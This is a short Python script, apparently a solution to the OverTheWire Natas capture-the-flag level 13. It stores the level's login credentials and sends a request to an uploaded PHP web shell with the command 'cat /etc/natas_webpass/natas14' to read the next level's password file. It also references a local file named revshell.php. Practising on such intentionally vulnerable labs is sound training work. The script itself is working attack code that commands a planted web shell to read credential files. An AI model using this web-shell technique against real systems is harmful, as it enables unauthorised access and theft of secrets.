import requests

username = 'natas13'
password = 'jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY'


url = 'http://%s.natas.labs.overthewire.org'  % username

files = {'uploadedfile': open('/home/alpha/over_the_wire/natas/level13/revshell.php', 'rb')}

response = requests.post(url + '/upload/dx70o7mahp.php?c=cat /etc/natas_webpass/natas14', auth = (username, password))
print(response.text)
 